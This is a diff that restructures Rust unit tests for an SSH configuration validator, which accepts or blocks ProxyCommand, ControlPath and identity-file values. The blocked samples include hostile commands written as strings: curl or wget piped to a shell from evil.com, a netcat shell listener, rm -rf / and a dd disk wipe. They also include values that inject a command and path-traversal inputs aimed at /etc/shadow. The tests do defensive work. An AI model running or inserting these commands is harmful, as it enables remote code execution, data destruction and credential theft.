@@ -12,131 +12,128 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
-#[cfg(test)]
-mod tests {
-    use super::super::*;
-    use super::super::checks::validate_identity_file_security;
-    use std::path::Path;
+use super::checks::validate_identity_file_security;
+use super::*;
+use std::path::Path;
 
-    #[test]
-    fn test_validate_executable_string_legitimate() {
-        // Test legitimate ProxyCommand values that should pass
-        let legitimate_commands = vec![
-            "ssh -W %h:%p gateway.example.com",
-            "connect -S proxy.example.com:1080 %h %p",
-            "none",
-            "socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
-        ];
+#[test]
+fn test_validate_executable_string_legitimate() {
+    // Test legitimate ProxyCommand values that should pass
+    let legitimate_commands = vec![
+        "ssh -W %h:%p gateway.example.com",
+        "connect -S proxy.example.com:1080 %h %p",
+        "none",
+        "socat - PROXY:proxy.example.com:%h:%p,proxyport=8080",
+    ];
 
-        for cmd in legitimate_commands {
-            let result = validate_executable_string(cmd, "ProxyCommand", 1);
-            assert!(result.is_ok(), "Legitimate command should pass: {cmd}");
-        }
+    for cmd in legitimate_commands {
+        let result = validate_executable_string(cmd, "ProxyCommand", 1);
+        assert!(result.is_ok(), "Legitimate command should pass: {cmd}");
     }
+}
 
-    #[test]
-    fn test_validate_executable_string_malicious() {
-        // Test malicious commands that should be blocked
-        let malicious_commands = vec![
-            "ssh -W %h:%p gateway.example.com; rm -rf /",
-            "ssh -W %h:%p gateway.example.com | bash",
-            "ssh -W %h:%p gateway.example.com & curl evil.com",
-            "ssh -W %h:%p `whoami`",
-            "ssh -W %h:%p $(whoami)",
-            "curl http://evil.com/malware.sh | bash",
-            "wget -O - http://evil.com/script | sh",
-            "nc -l 4444 -e /bin/sh",
-            "rm -rf /important/files",
-            "dd if=/dev/zero of=/dev/sda",
-        ];
+#[test]
+fn test_validate_executable_string_malicious() {
+    // Test malicious commands that should be blocked
+    let malicious_commands = vec![
+        "ssh -W %h:%p gateway.example.com; rm -rf /",
+        "ssh -W %h:%p gateway.example.com | bash",
+        "ssh -W %h:%p gateway.example.com & curl evil.com",
+        "ssh -W %h:%p `whoami`",
+        "ssh -W %h:%p $(whoami)",
+        "curl http://evil.com/malware.sh | bash",
+        "wget -O - http://evil.com/script | sh",
+        "nc -l 4444 -e /bin/sh",
+        "rm -rf /important/files",
+        "dd if=/dev/zero of=/dev/sda",
+    ];
 
-        for cmd in malicious_commands {
-            let result = validate_executable_string(cmd, "ProxyCommand", 1);
-            assert!(
-                result.is_err(),
-                "Malicious command should be blocked: {cmd}"
-            );
+    for cmd in malicious_commands {
+        let result = validate_executable_string(cmd, "ProxyCommand", 1);
+        assert!(
+            result.is_err(),
+            "Malicious command should be blocked: {cmd}"
+        );
 
-            let error = result.unwrap_err().to_string();
-            assert!(
-                error.contains("Security violation"),
-                "Error should mention security violation for: {cmd}. Got: {error}"
-            );
-        }
+        let error = result.unwrap_err().to_string();
+        assert!(
+            error.contains("Security violation"),
+            "Error should mention security violation for: {cmd}. Got: {error}"
+        );
     }
+}
 
-    #[test]
-    fn test_validate_control_path_legitimate() {
-        let legitimate_paths = vec![
-            "/tmp/ssh-control-%h-%p-%r",
-            "~/.ssh/control-%h-%p-%r",
-            "/var/run/ssh-%u-%h-%p",
-            "none",
-        ];
+#[test]
+fn test_validate_control_path_legitimate() {
+    let legitimate_paths = vec![
+        "/tmp/ssh-control-%h-%p-%r",
+        "~/.ssh/control-%h-%p-%r",
+        "/var/run/ssh-%u-%h-%p",
+        "none",
+    ];
 
-        for path in legitimate_paths {
-            let result = validate_control_path(path, 1);
-            assert!(result.is_ok(), "Legitimate ControlPath should pass: {path}");
-        }
+    for path in legitimate_paths {
+        let result = validate_control_path(path, 1);
+        assert!(result.is_ok(), "Legitimate ControlPath should pass: {path}");
     }
+}
 
-    #[test]
-    fn test_validate_control_path_malicious() {
-        let malicious_paths = vec![
-            "/tmp/ssh-control; rm -rf /",
-            "/tmp/ssh-control | bash",
-            "/tmp/ssh-control & curl evil.com",
-            "/tmp/ssh-control`whoami`",
-            "/tmp/ssh-control$(whoami)",
-            "-evil-flag",
-        ];
+#[test]
+fn test_validate_control_path_malicious() {
+    let malicious_paths = vec![
+        "/tmp/ssh-control; rm -rf /",
+        "/tmp/ssh-control | bash",
+        "/tmp/ssh-control & curl evil.com",
+        "/tmp/ssh-control`whoami`",
+        "/tmp/ssh-control$(whoami)",
+        "-evil-flag",
+    ];
 
-        for path in malicious_paths {
-            let result = validate_control_path(path, 1);
-            assert!(
-                result.is_err(),
-                "Malicious ControlPath should be blocked: {path}"
-            );
-        }
+    for path in malicious_paths {
+        let result = validate_control_path(path, 1);
+        assert!(
+            result.is_err(),
+            "Malicious ControlPath should be blocked: {path}"
+        );
     }
+}
 
-    #[test]
-    fn test_secure_validate_path_traversal() {
-        let traversal_paths = vec![
-            "../../../etc/passwd",
-            "/home/user/../../../etc/shadow",
-            "~/../../../etc/hosts",
-        ];
+#[test]
+fn test_secure_validate_path_traversal() {
+    let traversal_paths = vec![
+        "../../../etc/passwd",
+        "/home/user/../../../etc/shadow",
+        "~/../../../etc/hosts",
+    ];
 
-        for path in traversal_paths {
-            let result = secure_validate_path(path, "identity", 1);
-            assert!(result.is_err(), "Path traversal should be blocked: {path}");
+    for path in traversal_paths {
+        let result = secure_validate_path(path, "identity", 1);
+        assert!(result.is_err(), "Path traversal should be blocked: {path}");
 
-            let error = result.unwrap_err().to_string();
-            assert!(
-                error.contains("traversal") || error.contains("Security violation"),
-                "Error should mention traversal for: {path}. Got: {error}"
-            );
-        }
+        let error = result.unwrap_err().to_string();
+        assert!(
+            error.contains("traversal") || error.contains("Security violation"),
+            "Error should mention traversal for: {path}. Got: {error}"
+        );
     }
+}
 
-    #[test]
-    fn test_validate_identity_file_security() {
-        // Test sensitive system files
-        let sensitive_paths = vec![
-            Path::new("/etc/passwd"),
-            Path::new("/etc/shadow"),
-            Path::new("/proc/version"),
-            Path::new("/dev/null"),
-        ];
+#[test]
+fn test_validate_identity_file_security() {
+    // Test sensitive system files
+    let sensitive_paths = vec![
+        Path::new("/etc/passwd"),
+        Path::new("/etc/shadow"),
+        Path::new("/proc/version"),
+        Path::new("/dev/null"),
+    ];
 
-        for path in sensitive_paths {
-            let result = validate_identity_file_security(path, 1);
-            assert!(
-                result.is_err(),
-                "Sensitive path should be blocked: {}",
-                path.display()
-            );
-        }
+    for path in sensitive_paths {
+        let result = validate_identity_file_security(path, 1);
+        assert!(
+            result.is_err(),
+            "Sensitive path should be blocked: {}",
+            path.display()
+        );
     }
 }
